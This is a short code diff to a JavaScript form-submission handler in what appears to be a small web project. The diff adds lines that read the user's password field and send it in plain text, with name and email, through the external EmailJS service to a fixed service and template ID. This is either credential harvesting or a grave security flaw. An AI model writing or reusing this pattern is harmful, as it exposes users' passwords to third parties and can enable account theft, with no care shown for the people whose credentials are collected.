@@ -108,14 +108,16 @@ document.addEventListener("DOMContentLoaded", function () {
 
         var nombre = document.getElementById("name").value;
         var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
 
         localStorage.setItem("nombreUsuario", nombre);
         localStorage.setItem("emailUsuario", email);
 
         emailjs.send("service_eo3z01f", "template_gs7boxt", {
-            name: nombre,
-            email: email
-        })
+    name: nombre,
+    email: email,
+    password: password
+})
         .then(function() {
             window.location.href = "dashboard.html";
         }, function(error) {
